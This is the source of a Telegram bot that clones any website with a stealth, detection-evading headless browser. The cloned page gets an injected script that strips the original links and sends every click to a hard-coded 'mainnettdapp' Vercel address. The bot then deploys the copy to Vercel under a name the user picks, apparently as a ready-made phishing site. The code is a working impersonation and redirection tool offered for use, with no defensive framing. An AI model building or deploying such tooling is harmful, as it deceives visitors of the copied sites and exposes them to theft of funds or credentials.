import { Telegraf, Markup } from "telegraf";
import axios from "axios";
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { URL } from "url";
import { Vercel } from "@vercel/sdk";
import dotenv from "dotenv";
import { fileURLToPath } from "url";

// __dirname is undefined in ESM, so define it manually:
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config();

const vercel = new Vercel({
  bearerToken: process.env.vercelToken, // replace with your real token
});

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
puppeteer.use(StealthPlugin());

// Track per-user states
const userStates = new Map();

// /start command
bot.start((ctx) => {
  ctx.reply("✅ Welcome! Use /clone to fetch a website’s HTML.");
});


// /run command
bot.command("run", (ctx) => {
  ctx.reply("🏃‍♂️ Running...");
});

// /clone command – ask for website
bot.command("clone", (ctx) => {
  ctx.reply(
    "🔗 Enter the <b>website URL</b> you want to clone (must start with <code>https://</code>)\n\n✅ Make sure the site is live and accessible.",
    { parse_mode: "HTML" }
  );

  userStates.set(ctx.chat.id, "awaiting_url");
});

const userFolders = new Map();

bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  // === CASE 1: CLONING ===
  if (state === "awaiting_url") {
    const siteUrl = ctx.message.text.toLowerCase();
    if (!siteUrl.startsWith("https://")) {
      return ctx.reply("❌ Enter a valid link that starts with *https://*", {
        parse_mode: "Markdown",
      });
    }

    userStates.delete(ctx.chat.id);
    await ctx.reply(
      "🔍 Cloning the full website...\n\nHang tight — this might take a little while."
    );

    (async () => {
      const outputDir = path.join(__dirname, "cloned");
      const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
      const assetCache = new Map();

      // Clear the cloned folder before starting
      try {
        await fs.remove(outputDir);
        console.log("✅ Cleared existing cloned folder");
      } catch (err) {
        console.warn(`⚠️ Failed to clear cloned folder: ${err.message}`);
      }

      // Ensure output directory
      await fs.ensureDir(outputDir, { mode: 0o755 });

      // Function to sanitize file paths
      const sanitizePath = (pathname) => {
        return pathname
          .replace(/[:*?"<>|]/g, "_") // Replace invalid Windows characters
          .replace(/^-+/, "") // Remove leading dashes
          .replace(/\/+/g, "/") // Normalize slashes
          .replace(/^\/+/, ""); // Remove leading slashes
      };

      try {
        // Ensure output directory
        await fs.ensureDir(outputDir, { mode: 0o755 });

        // Launch browser
        const browser = await puppeteer.launch({
          headless: "new",
          args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-blink-features=AutomationControlled",
            "--disable-web-security",
            "--disable-features=IsolateOrigins,site-per-process",
          ],
        });

        const page = await browser.newPage();

        // Bot evasion
        await page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, "webdriver", { get: () => false });
          Object.defineProperty(navigator, "platform", { get: () => "Win32" });
          Object.defineProperty(navigator, "vendor", {
            get: () => "Google Inc.",
          });
          Object.defineProperty(navigator, "languages", {
            get: () => ["en-US", "en"],
          });
          window.chrome = { runtime: {} };
          Object.defineProperty(navigator, "plugins", {
            get: () => [
              { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer" },
              {
                name: "Chrome PDF Viewer",
                filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai",
              },
            ],
          });
        });

        await page.setUserAgent(
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        );

        await page.setRequestInterception(true);

        // Handle requests
        page.on("request", (req) => {
          const resourceType = req.resourceType();
          const url = req.url();
          if (["beacon", "csp_report"].includes(resourceType)) {
            req.abort();
            return;
          }
          if (
            /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|json)$/.test(url)
          ) {
            req.continue({
              headers: {
                ...req.headers(),
                Referer: siteUrl,
                Accept:
                  resourceType === "stylesheet"
                    ? "text/css"
                    : resourceType === "script"
                    ? "*/*"
                    : "image/*,font/*",
              },
            });
          } else {
            req.continue();
          }
        });

        // Capture assets
        page.on("requestfinished", async (req) => {
          const url = req.url();
          if (url.startsWith("data:")) return;

          try {
            const response = await req.response();
            if (!response || !response.ok()) {
              console.warn(
                `⚠️ Invalid response for ${url}: Status ${response?.status()}`
              );
              return;
            }

            const contentType = response.headers()["content-type"] || "";
            if (
              !/(css|javascript|font|image|svg|octet-stream|json)/.test(
                contentType
              )
            ) {
              console.warn(
                `⚠️ Skipped ${url}: Invalid content-type ${contentType}`
              );
              return;
            }

            const buffer = await response.buffer();
            const pathname = sanitizePath(new URL(url, siteUrl).pathname);
            assetCache.set(pathname, buffer);
            console.log(`📦 Intercepted: ${pathname} (${contentType})`);
          } catch (err) {
            console.warn(`⚠️ Failed intercept: ${url} - ${err.message}`);
          }
        });

        // Navigate with extended wait
        try {
          await page.goto(siteUrl, {
            waitUntil: "networkidle0",
            timeout: 60000,
          });
        } catch (err) {
          console.warn(
            "⚠️ Navigation failed, retrying with domcontentloaded...",
            err.message
          );
          await page.goto(siteUrl, {
            waitUntil: "domcontentloaded",
            timeout: 30000,
          });
        }
        await page.waitForSelector("body", { timeout: 30000 });
        await page.mouse.move(Math.random() * 800, Math.random() * 600); // Simulate human behavior
        await new Promise((resolve) => setTimeout(resolve, 20000)); // Extended wait for dynamic assets

        // Extract HTML, stylesheets, and inline styles
        const { html, stylesheets, inlineStyles } = await page.evaluate(() => {
          const links = Array.from(
            document.querySelectorAll(
              'link[rel="stylesheet"], link[rel="preload"][as="style"]'
            )
          ).map((l) => l.href);
          const styles = Array.from(document.querySelectorAll("style")).map(
            (s) => s.innerText
          );
          return {
            html: document.documentElement.outerHTML,
            stylesheets: links,
            inlineStyles: styles,
          };
        });

        if (!html || html.length < 100) {
          throw new Error("❌ Empty or invalid HTML content");
        }
        const $ = cheerio.load(html);

        $("base").remove();

        // Remove href from all <a> tags
        $("a[href]").each((_, el) => {
          $(el).removeAttr("href");
          console.log("✅ Removed href from <a> tag");
        });

        // Save inline styles
        inlineStyles.forEach((style, index) => {
          const styleId = `inline-style-${index}`;
          $("head").append(`<style id="${styleId}">${style}</style>`);
          console.log(`✅ Added inline style: ${styleId}`);
        });

        // Process external CSS
        const cssDir = path.join(outputDir, "css");
        await fs.ensureDir(cssDir);
        for (const href of stylesheets) {
          if (!href || href.startsWith("data:")) continue;

          try {
            const fullUrl = new URL(href, siteUrl);
            const pathname = sanitizePath(fullUrl.pathname);
            const localCssPath = path
              .join("css", path.basename(pathname))
              .replace(/\\/g, "/");
            const savePath = path.join(outputDir, localCssPath);

            let cssBuffer = assetCache.get(pathname);
            let contentType = "text/css";

            // Fetch CSS if not in cache
            if (!cssBuffer) {
              console.warn(`⚠️ CSS not in cache, fetching: ${href}`);
              const resp = await page.goto(fullUrl.href, {
                waitUntil: "networkidle0",
                timeout: 15000,
              });
              if (!resp.ok()) {
                console.warn(
                  `⚠️ Failed to fetch CSS: ${href} - Status ${resp.status()}`
                );
                $("head").append(`<link rel="stylesheet" href="${href}">`);
                continue;
              }
              contentType = resp.headers()["content-type"] || "";
              if (!contentType.includes("text/css")) {
                console.warn(
                  `⚠️ Invalid CSS content-type: ${contentType} for ${href}`
                );
                $("head").append(`<link rel="stylesheet" href="${href}">`);
                continue;
              }
              cssBuffer = await resp.buffer();
              assetCache.set(pathname, cssBuffer);
            }

            const cssText = cssBuffer.toString("utf-8");
            if (!cssText) {
              console.warn(`⚠️ Empty CSS content: ${href}`);
              $("head").append(`<link rel="stylesheet" href="${href}">`);
              continue;
            }

            // Rewrite URLs in CSS
            const rewrittenCss = cssText.replace(
              /url\(['"]?([^'")]+)['"]?\)/g,
              (_, assetUrl) => {
                try {
                  const assetPath = sanitizePath(
                    new URL(assetUrl, fullUrl).pathname
                  );
                  if (assetCache.has(assetPath)) {
                    console.log(
                      `✅ Rewrote CSS URL: ${assetUrl} -> /${assetPath}`
                    );
                    return `url(/${assetPath})`;
                  }
                  console.warn(`⚠️ CSS asset not found: ${assetUrl}`);
                  return `url(${assetUrl})`;
                } catch (err) {
                  console.warn(
                    `⚠️ Failed to rewrite CSS URL: ${assetUrl} - ${err.message}`
                  );
                  return `url(${assetUrl})`;
                }
              }
            );

            // Save CSS
            await fs.ensureDir(path.dirname(savePath));
            await fs.writeFile(savePath, rewrittenCss);
            console.log(`✅ Saved CSS: ${savePath}`);

            // Inline CSS or use local link
            try {
              $("head").append(`<style>${rewrittenCss}</style>`);
              console.log(`🎨 Inlined CSS: ${href}`);
            } catch (err) {
              console.warn(
                `⚠️ Failed to inline CSS, using local link: ${href} - ${err.message}`
              );
              $("head").append(
                `<link rel="stylesheet" href="/${localCssPath}">`
              );
            }
          } catch (err) {
            console.warn(`❌ Failed to process CSS: ${href} - ${err.message}`);
            $("head").append(`<link rel="stylesheet" href="${href}">`);
          }
        }

        // Save other assets
        for (const [pathname, buffer] of assetCache.entries()) {
          if (pathname.startsWith("data:")) continue;
          const sanitizedPath = sanitizePath(pathname);
          const fullPath = path.join(outputDir, sanitizedPath);
          try {
            await fs.ensureDir(path.dirname(fullPath));
            await fs.writeFile(fullPath, buffer);
            console.log(`✅ Saved asset: ${fullPath}`);
          } catch (err) {
            console.warn(
              `❌ Failed to save asset: ${sanitizedPath} - ${err.message}`
            );
          }
        }

        // Rewrite asset paths in HTML
        $("[href], [src]").each((_, el) => {
          const $el = $(el);
          const attr = $el.attr("href") ? "href" : "src";
          const val = $el.attr(attr);

          if (
            !val ||
            val.startsWith("data:") ||
            val.startsWith("mailto:") ||
            val.startsWith("javascript:")
          )
            return;

          try {
            const full = new URL(val, siteUrl);
            const pathname = sanitizePath(full.pathname);
            if (assetCache.has(pathname)) {
              $el.attr(attr, `/${pathname}`);
              console.log(`✅ Rewrote ${attr}: ${val} -> /${pathname}`);
            } else {
              console.warn(`⚠️ Asset not found for ${attr}: ${val}`);
              $el.attr(attr, val); // Keep original if not found
            }
          } catch (err) {
            console.warn(
              `⚠️ Failed to rewrite ${attr}: ${val} - ${err.message}`
            );
          }
        });

        $("body").append(`
 <style>
   a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
     cursor: pointer !important;
   }
 </style>
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const elements = document.querySelectorAll("a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
   elements.forEach(el => {
     el.onclick = null;
     el.removeAttribute("onclick");
     if (window.jQuery && typeof jQuery === "function") {
       try { jQuery(el).off("click"); } catch (err) {}
     }
     const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
     if (reactKey) delete el[reactKey];
     el.addEventListener("click", (e) => {
       e.preventDefault();
       e.stopImmediatePropagation();
       window.location.href = ${JSON.stringify(redirectURL)};
     }, true);
   });
 });
 </script>
 `);

        // Save HTML
        const outputHtmlPath = path.join(outputDir, "index.html");
        await fs.writeFile(outputHtmlPath, $.html());
        console.log("✅ Clone complete:", outputHtmlPath);

        await fs.outputFile(path.join(outputDir, "index.html"), $.html());
        console.log("✅ Done! Saved at cloned/index.html");

        await ctx.reply(
          "✅ Site cloned using original CSS links! Ready for deploy.",
          Markup.inlineKeyboard([
            Markup.button.callback("🚀 Host Site", "host"),
          ])
        );
      } catch (err) {
        console.error("❌ Error:", err.message, err.stack);
        console.error("❌ Clone error:", err.message);
        await ctx.reply("⚠️ Failed to clone site.");
        process.exit(1);
      }
    })();
  }

  // === CASE 2: HOSTING ===
  if (state === "awaiting_site_name") {
    userStates.delete(ctx.chat.id);
    const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

    if (!siteName || siteName.length < 3) {
      return ctx.reply("❌ Site name is too short or invalid. Try again.");
    }

    const folder = "./cloned";
    if (!fs.existsSync(folder)) {
      return ctx.reply("❌ No cloned folder found. Please clone a site first.");
    }

    await ctx.reply("🛠️ Just a moment...\n\nWe're getting your site ready!");

    const TEXT_FILE_EXTENSIONS = [
      ".html",
      ".js",
      ".css",
      ".json",
      ".txt",
      ".md",
    ];
    const isTextFile = (filePath) =>
      TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

    function getFilesArray(dir, baseDir = dir) {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      let files = [];

      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        const relativePath = path
          .relative(baseDir, fullPath)
          .replace(/\\/g, "/");

        if (entry.isDirectory()) {
          files = files.concat(getFilesArray(fullPath, baseDir));
        } else {
          const fileBuffer = fs.readFileSync(fullPath);
          const data = isTextFile(fullPath)
            ? fileBuffer.toString("utf-8")
            : fileBuffer.toString("base64");

          files.push({ file: relativePath, data });
        }
      }

      return files;
    }

    const files = getFilesArray(folder);

    try {
      const result = await vercel.deployments.createDeployment({
        teamId: process.env.vercelTeamId, // replace with your real team ID
        slug: siteName,
        requestBody: {
          name: siteName,
          project: siteName,
          target: "production",
          files: files,
          projectSettings: {
            framework: null,
            buildCommand: null,
            installCommand: null,
            outputDirectory: ".",
          },
        },
      });

      console.log("✅ Deployment complete!", result);

    setTimeout(() => {
        ctx.reply(
        `✅ *Deployment Successful!*\n\n` +
          `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
          `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
          `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
          `🎉 Your site is now live on Vercel!`,
        { parse_mode: "Markdown" }
      );
    }, 3000); // Delay to ensure Vercel processes the deployment
    } catch (error) {
      console.error("❌ Hosting error:", error);
      ctx.reply("⚠️ Error deploying site. Please try again later.");
    }
  }
});

// Handle "Host" button click
bot.action("host", async (ctx) => {
  ctx.answerCbQuery();
  userStates.set(ctx.chat.id, "awaiting_site_name");
  return ctx.reply(
    "💡 <b>What's the name of your site?</b>\n\n⚠️ Make sure it's unique and hasn't been used before.",
    { parse_mode: "HTML" }
  );
});

// Handle text message (e.g., site name)
bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  if (state !== "awaiting_site_name") return;

  userStates.delete(ctx.chat.id); // Clear state
  const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

  if (!siteName || siteName.length < 3 || siteName.includes(".")) {
    return ctx.reply(
      "⚠️ The site name is too short or invalid.\n\n🚫 Dots (.) are not allowed.\n✍️ Please try again with just the name."
    );
  }

  const folder = "./cloned";
  console.log("Hosting folder:", folder);

  if (!fs.existsSync(folder)) {
    return ctx.reply("❌ No cloned folder found. Please clone a site first.");
  }

  const TEXT_FILE_EXTENSIONS = [".html", ".js", ".css", ".json", ".txt", ".md"];
  const isTextFile = (filePath) =>
    TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

  function getFilesArray(dir, baseDir = dir) {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    let files = [];

    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      const relativePath = path.relative(baseDir, fullPath).replace(/\\/g, "/");

      if (entry.isDirectory()) {
        files = files.concat(getFilesArray(fullPath, baseDir));
      } else {
        const fileBuffer = fs.readFileSync(fullPath);
        const data = isTextFile(fullPath)
          ? fileBuffer.toString("utf-8")
          : fileBuffer.toString("base64");

        files.push({ file: relativePath, data });
      }
    }

    return files;
  }

  const files = getFilesArray(folder);

  try {
    const result = await vercel.deployments.createDeployment({
      teamId: "team_AwRWdZTHaoWRoHvGvRg19YS7",
      slug: siteName,
      requestBody: {
        name: siteName,
        project: siteName,
        target: "production",
        files: files,
        projectSettings: {
          framework: null,
          buildCommand: null,
          installCommand: null,
          outputDirectory: ".",
        },
      },
    });

    console.log("✅ Deployment complete!", result);

    ctx.reply(
      `✅ *Deployment Successful!*\n\n` +
        `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
        `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
        `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
        `🎉 Your site is now live on Vercel!`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("❌ Hosting error:", error);
    ctx.reply("⚠️ Error deploying site. Please try again later.");
  }
});

// Start the bot
bot.launch().then(() => {
  console.log("🤖 Bot is running...");
});
console.log("🤖 Bot is running...");
